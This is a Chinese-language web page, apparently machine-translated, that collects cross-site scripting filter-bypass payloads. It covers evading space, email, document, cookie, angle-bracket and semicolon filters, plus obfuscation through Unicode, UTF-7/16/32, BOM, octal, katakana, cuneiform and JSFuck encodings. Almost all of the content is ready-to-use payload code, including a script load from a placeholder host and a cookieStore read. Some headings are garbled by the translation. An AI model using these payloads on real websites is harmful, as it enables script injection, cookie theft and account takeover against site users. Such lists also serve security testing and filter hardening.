<h3 id="-46"><a href="#-46" class="headerlink" title=""></a></h3><h3 id="旁路-空间-滤波-器"><a href="#旁路-空间-滤波-器" class="headerlink" title="旁路 空间 滤波 器"></a>旁路 空间 滤波 器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Bypass space filter with &quot;/&quot;</span><br><span class="line">&lt;img/src=&#x27;1&#x27;/onerror=alert(0)&gt;</span><br><span class="line"></span><br><span class="line">// Bypass space filter with 0x0c/^L</span><br><span class="line">&lt;svgonload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">$ echo &quot;&lt;svg^Lonload^L=^Lalert(1)^L&gt;&quot; | xxd</span><br><span class="line">00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  &lt;svg.onload.=.al</span><br><span class="line">00000010: 6572 7428 3129 0c3e 0a                   ert(1).&gt;.</span><br></pre></td></tr></table></figure>

<h3 id="-47"><a href="#-47" class="headerlink" title=""></a></h3><h3 id="绕过-电子-邮件-过滤-器"><a href="#绕过-电子-邮件-过滤-器" class="headerlink" title="绕过 电子 邮件 过滤 器"></a>绕过 电子 邮件 过滤 器</h3><p>（<a href="http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate">符合 RFC 标准</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/onload=confirm(1)&gt;&quot;@x.y</span><br></pre></td></tr></table></figure>

<h3 id="-48"><a href="#-48" class="headerlink" title=""></a></h3><h3 id="绕过文档黑名单"><a href="#绕过文档黑名单" class="headerlink" title="绕过文档黑名单"></a>绕过文档黑名单</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id = &quot;x&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(x.parentNode.parentNode.parentNode.location)&lt;/script&gt;</span><br><span class="line">window[&quot;doc&quot;+&quot;ument&quot;]</span><br></pre></td></tr></table></figure>

<h3 id="-49"><a href="#-49" class="headerlink" title=""></a></h3><h3 id="绕过文档-cookie黑名单"><a href="#绕过文档-cookie黑名单" class="headerlink" title="绕过文档.cookie黑名单"></a>绕过文档.cookie黑名单</h3><p>这是访问Chrome、Edge和Opera上的cookie的另一种方法。请将COOKIE NAME替换为您要访问的cookie。如果getAll（）方法符合您的要求，您也可以研究一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.cookieStore.get(&#x27;COOKIE NAME&#x27;).then((cookieValue)=&gt;&#123;alert(cookieValue.value);&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="-50"><a href="#-50" class="headerlink" title=""></a></h3><h3 id="绕过在字符串内使用javascript"><a href="#绕过在字符串内使用javascript" class="headerlink" title="绕过在字符串内使用javascript"></a>绕过在字符串内使用javascript</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">foo=&quot;text &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-51"><a href="#-51" class="headerlink" title=""></a></h3><h3 id="使用其他方式绕过重定向"><a href="#使用其他方式绕过重定向" class="headerlink" title="使用其他方式绕过重定向"></a>使用其他方式绕过重定向</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location=&quot;http://google.com&quot;</span><br><span class="line">document.location = &quot;http://google.com&quot;</span><br><span class="line">document.location.href=&quot;http://google.com&quot;</span><br><span class="line">window.location.assign(&quot;http://google.com&quot;)</span><br><span class="line">window[&#x27;location&#x27;][&#x27;href&#x27;]=&quot;http://google.com&quot;</span><br></pre></td></tr></table></figure>

<h3 id="-52"><a href="#-52" class="headerlink" title=""></a></h3><h3 id="使用替代方式绕过以执行警报"><a href="#使用替代方式绕过以执行警报" class="headerlink" title="使用替代方式绕过以执行警报"></a>使用替代方式绕过以执行警报</h3><p>起始日期<a href="https://twitter.com/brutelogic/status/965642032424407040">@野兽逻辑</a> 鸣叫。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window[&#x27;alert&#x27;](0)</span><br><span class="line">parent[&#x27;alert&#x27;](1)</span><br><span class="line">self[&#x27;alert&#x27;](2)</span><br><span class="line">top[&#x27;alert&#x27;](3)</span><br><span class="line">this[&#x27;alert&#x27;](4)</span><br><span class="line">frames[&#x27;alert&#x27;](5)</span><br><span class="line">content[&#x27;alert&#x27;](6)</span><br><span class="line"></span><br><span class="line">[7].map(alert)</span><br><span class="line">[8].find(alert)</span><br><span class="line">[9].every(alert)</span><br><span class="line">[10].filter(alert)</span><br><span class="line">[11].findIndex(alert)</span><br><span class="line">[12].forEach(alert);</span><br></pre></td></tr></table></figure>

<p>起始日期<a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/">@中间</a> - 使用全局变量</p>
<p>keys（）方法返回一个由给定对象自身属性名组成的数组，其顺序与普通循环中的顺序相同。<strong>索引号而不是函数名</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=0; for(i in self) &#123; if(i == &quot;alert&quot;) &#123; console.log(c); &#125; c++; &#125;</span><br><span class="line">// 5</span><br></pre></td></tr></table></figure>

<p>这时打来警报的是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object.keys(self)[5]</span><br><span class="line">// &quot;alert&quot;</span><br><span class="line">self[Object.keys(self)[5]](&quot;1&quot;) // alert(&quot;1&quot;)</span><br></pre></td></tr></table></figure>

<p>我们可以用^a[rel]+t$这样的正则表达式找到“alert”：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=()=&gt;&#123;c=0;for(i in self)&#123;if(/^a[rel]+t$/.test(i))&#123;return c&#125;c++&#125;&#125; //bind function alert on new function a()</span><br><span class="line"></span><br><span class="line">// then you can use a() with Object.keys</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;1&quot;) // alert(&quot;1&quot;)</span><br></pre></td></tr></table></figure>

<p>一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=()=&gt;&#123;c=0;for(i in self)&#123;if(/^a[rel]+t$/.test(i))&#123;return c&#125;c++&#125;&#125;;self[Object.keys(self)[a()]](&quot;1&quot;)</span><br></pre></td></tr></table></figure>

<p>起始日期<a href="https://twitter.com/quanyang/status/1078536601184030721">@泉阳</a> 鸣叫。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prompt`$&#123;document.domain&#125;`</span><br><span class="line">document.location=&#x27;java\tscript:alert(1)&#x27;</span><br><span class="line">document.location=&#x27;java\rscript:alert(1)&#x27;</span><br><span class="line">document.location=&#x27;java\tscript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>

<p>起始日期<a href="https://twitter.com/404death/status/1011860096685502464">@404死亡</a> 鸣叫。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&#x27;ale&#x27;+&#x27;rt(0)&#x27;);</span><br><span class="line">Function(&quot;ale&quot;+&quot;rt(1)&quot;)();</span><br><span class="line">new Function`al\ert\`6\``;</span><br><span class="line"></span><br><span class="line">constructor.constructor(&quot;aler&quot;+&quot;t(3)&quot;)();</span><br><span class="line">[].filter.constructor(&#x27;ale&#x27;+&#x27;rt(4)&#x27;)();</span><br><span class="line"></span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](5);</span><br><span class="line">top[8680439..toString(30)](7);</span><br><span class="line">top[/al/.source+/ert/.source](8);</span><br><span class="line">top[&#x27;al\x65rt&#x27;](9);</span><br><span class="line"></span><br><span class="line">open(&#x27;java&#x27;+&#x27;script:ale&#x27;+&#x27;rt(11)&#x27;);</span><br><span class="line">location=&#x27;javascript:ale&#x27;+&#x27;rt(12)&#x27;;</span><br><span class="line"></span><br><span class="line">setTimeout`alert\u0028document.domain\u0029`;</span><br><span class="line">setTimeout(&#x27;ale&#x27;+&#x27;rt(2)&#x27;);</span><br><span class="line">setInterval(&#x27;ale&#x27;+&#x27;rt(10)&#x27;);</span><br><span class="line">Set.constructor(&#x27;ale&#x27;+&#x27;rt(13)&#x27;)();</span><br><span class="line">Set.constructor`al\x65rt\x2814\x29```;</span><br></pre></td></tr></table></figure>

<p>使用替代方式绕过以触发警报</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var i = document.createElement(&quot;iframe&quot;);</span><br><span class="line">i.onload = function()&#123;</span><br><span class="line">  i.contentWindow.alert(1);</span><br><span class="line">&#125;</span><br><span class="line">document.appendChild(i);</span><br><span class="line"></span><br><span class="line">// Bypassed security</span><br><span class="line">XSSObject.proxy = function (obj, name, report_function_name, exec_original) &#123;</span><br><span class="line">      var proxy = obj[name];</span><br><span class="line">      obj[name] = function () &#123;</span><br><span class="line">        if (exec_original) &#123;</span><br><span class="line">          return proxy.apply(this, arguments);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      XSSObject.lockdown(obj, name);</span><br><span class="line">  &#125;;</span><br><span class="line">XSSObject.proxy(window, &#x27;alert&#x27;, &#x27;window.alert&#x27;, false);</span><br></pre></td></tr></table></figure>

<h3 id="-53"><a href="#-53" class="headerlink" title=""></a></h3><h3 id="不使用任何内容绕过“〉”"><a href="#不使用任何内容绕过“〉”" class="headerlink" title="不使用任何内容绕过“〉”"></a>不使用任何内容绕过“〉”</h3><p>您不需要关闭标签。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(1)//</span><br></pre></td></tr></table></figure>

<h3 id="-54"><a href="#-54" class="headerlink" title=""></a></h3><h3 id="使用以下命令绕过“〈”和“〉”-lt-and-gt"><a href="#使用以下命令绕过“〈”和“〉”-lt-and-gt" class="headerlink" title="使用以下命令绕过“〈”和“〉”&lt; and &gt;"></a>使用以下命令绕过“〈”和“〉”&lt; and &gt;</h3><p>Unicode字符U+ FF 1C和U+ FF 1 E</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">＜script/src=//evil.site/poc.js＞</span><br></pre></td></tr></table></figure>

<h3 id="-55"><a href="#-55" class="headerlink" title=""></a></h3><h3 id="使用其他字符绕过“-”"><a href="#使用其他字符绕过“-”" class="headerlink" title="使用其他字符绕过“;”"></a>使用其他字符绕过“;”</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;te&#x27; * alert(&#x27;*&#x27;) * &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; / alert(&#x27;/&#x27;) / &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; % alert(&#x27;%&#x27;) % &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; - alert(&#x27;-&#x27;) - &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; + alert(&#x27;+&#x27;) + &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; ^ alert(&#x27;^&#x27;) ^ &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; &gt; alert(&#x27;&gt;&#x27;) &gt; &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; &lt; alert(&#x27;&lt;&#x27;) &lt; &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; == alert(&#x27;==&#x27;) == &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; &amp; alert(&#x27;&amp;&#x27;) &amp; &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; , alert(&#x27;,&#x27;) , &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; | alert(&#x27;|&#x27;) | &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; ? alert(&#x27;ifelsesh&#x27;) : &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; in alert(&#x27;in&#x27;) in &#x27;xt&#x27;;</span><br><span class="line">&#x27;te&#x27; instanceof alert(&#x27;instanceof&#x27;) instanceof &#x27;xt&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="-56"><a href="#-56" class="headerlink" title=""></a></h3><h3 id="略过使用HTML编码"><a href="#略过使用HTML编码" class="headerlink" title="略过使用HTML编码"></a>略过使用HTML编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%26%2397;lert(1)</span><br><span class="line">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;</span><br><span class="line">&gt;&lt;/script&gt;&lt;svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-57"><a href="#-57" class="headerlink" title=""></a></h3><h3 id="使用Katana绕过"><a href="#使用Katana绕过" class="headerlink" title="使用Katana绕过"></a>使用Katana绕过</h3><p>使用<a href="https://github.com/aemkei/katakana.js">片假名</a> 数据库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:([,ウ,,,,ア]=[]+&#123;&#125;,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+&#x27;(-~ウ)&#x27;)()</span><br></pre></td></tr></table></figure>

<h3 id="-58"><a href="#-58" class="headerlink" title=""></a></h3><h3 id="使用楔形文字绕过"><a href="#使用楔形文字绕过" class="headerlink" title="使用楔形文字绕过"></a>使用楔形文字绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">𒀀=&#x27;&#x27;,𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+&#123;&#125;,𒌐=𒉺[𒀀++],</span><br><span class="line">𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]</span><br><span class="line">+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]</span><br><span class="line">+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+&quot;(𒀀)&quot;)()</span><br></pre></td></tr></table></figure>

<h3 id="-59"><a href="#-59" class="headerlink" title=""></a></h3><h3 id="使用Lontara进行旁路"><a href="#使用Lontara进行旁路" class="headerlink" title="使用Lontara进行旁路"></a>使用Lontara进行旁路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ᨆ=&#x27;&#x27;,ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+&#123;&#125;,ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+&quot;(ᨆ)&quot;)()</span><br></pre></td></tr></table></figure>

<p>更多字母<a href="http://aem1k.com/aurebesh.js/#">http://aem1k.com/aurebesh.js/#</a></p>
<h3 id="-60"><a href="#-60" class="headerlink" title=""></a></h3><h3 id="使用ECMAScript6绕过"><a href="#使用ECMAScript6绕过" class="headerlink" title="使用ECMAScript6绕过"></a>使用ECMAScript6绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert&amp;DiacriticalGrave;1&amp;DiacriticalGrave;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-61"><a href="#-61" class="headerlink" title=""></a></h3><h3 id="使用八进制编码绕过"><a href="#使用八进制编码绕过" class="headerlink" title="使用八进制编码绕过"></a>使用八进制编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="-62"><a href="#-62" class="headerlink" title=""></a></h3><h3 id="不使用Unicode"><a href="#不使用Unicode" class="headerlink" title="不使用Unicode"></a>不使用Unicode</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was</span><br><span class="line">transformed into U+003C LESS­THAN SIGN (&lt;)</span><br><span class="line"></span><br><span class="line">Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was</span><br><span class="line">transformed into U+0022 QUOTATION MARK (&quot;)</span><br><span class="line"></span><br><span class="line">Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was</span><br><span class="line">transformed into U+0027 APOSTROPHE (&#x27;)</span><br><span class="line"></span><br><span class="line">E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/</span><br><span class="line">%EF%BC%9E becomes &gt;</span><br><span class="line">%EF%BC%9C becomes &lt;</span><br></pre></td></tr></table></figure>

<p>绕过使用Unicode转换为大写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">İ (%c4%b0).toLowerCase() =&gt; i</span><br><span class="line">ı (%c4%b1).toUpperCase() =&gt; I</span><br><span class="line">ſ (%c5%bf) .toUpperCase() =&gt; S</span><br><span class="line">K (%E2%84%AA).toLowerCase() =&gt; k</span><br><span class="line"></span><br><span class="line">&lt;ſvg onload=... &gt; become &lt;SVG ONLOAD=...&gt;</span><br><span class="line">&lt;ıframe id=x onload=&gt;.toUpperCase() become &lt;IFRAME ID=X ONLOAD=&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-63"><a href="#-63" class="headerlink" title=""></a></h3><h3 id="使用UTF-7绕过"><a href="#使用UTF-7绕过" class="headerlink" title="使用UTF-7绕过"></a>使用UTF-7绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-</span><br></pre></td></tr></table></figure>

<h3 id="-64"><a href="#-64" class="headerlink" title=""></a></h3><h3 id="使用UTF-8绕过"><a href="#使用UTF-8绕过" class="headerlink" title="使用UTF-8绕过"></a>使用UTF-8绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC</span><br><span class="line">&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE</span><br><span class="line">&#x27; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7</span><br><span class="line">&quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2</span><br><span class="line">&quot; = %CA%BA</span><br><span class="line">&#x27; = %CA%B9</span><br></pre></td></tr></table></figure>

<h3 id="-65"><a href="#-65" class="headerlink" title=""></a></h3><h3 id="使用UTF-16-be绕过"><a href="#使用UTF-16-be绕过" class="headerlink" title="使用UTF-16 be绕过"></a>使用UTF-16 be绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00</span><br><span class="line">\x00&lt;\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-66"><a href="#-66" class="headerlink" title=""></a></h3><h3 id="使用UTF-32绕过"><a href="#使用UTF-32绕过" class="headerlink" title="使用UTF-32绕过"></a>使用UTF-32绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E</span><br></pre></td></tr></table></figure>

<h3 id="-67"><a href="#-67" class="headerlink" title=""></a></h3><h3 id="略过使用材料表"><a href="#略过使用材料表" class="headerlink" title="略过使用材料表"></a>略过使用材料表</h3><p>字节顺序标记（页面必须以BOM字符开始。） BOM字符允许您覆盖页面的字符集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOM Character for UTF-16 Encoding:</span><br><span class="line">Big Endian : 0xFE 0xFF</span><br><span class="line">Little Endian : 0xFF 0xFE</span><br><span class="line">XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E</span><br><span class="line"></span><br><span class="line">BOM Character for UTF-32 Encoding:</span><br><span class="line">Big Endian : 0x00 0x00 0xFE 0xFF</span><br><span class="line">Little Endian : 0xFF 0xFE 0x00 0x00</span><br><span class="line">XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E</span><br></pre></td></tr></table></figure>

<h3 id="-68"><a href="#-68" class="headerlink" title=""></a></h3><h3 id="使用奇怪的编码或本机解释绕过"><a href="#使用奇怪的编码或本机解释绕过" class="headerlink" title="使用奇怪的编码或本机解释绕过"></a>使用奇怪的编码或本机解释绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();&lt;/script&gt;</span><br><span class="line">&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="-69"><a href="#-69" class="headerlink" title=""></a></h3><h3 id="使用jsfuck绕过"><a href="#使用jsfuck绕过" class="headerlink" title="使用jsfuck绕过"></a>使用jsfuck绕过</h3><p>旁路使用<a href="http://www.jsfuck.com/">jsfuck函数</a></p>
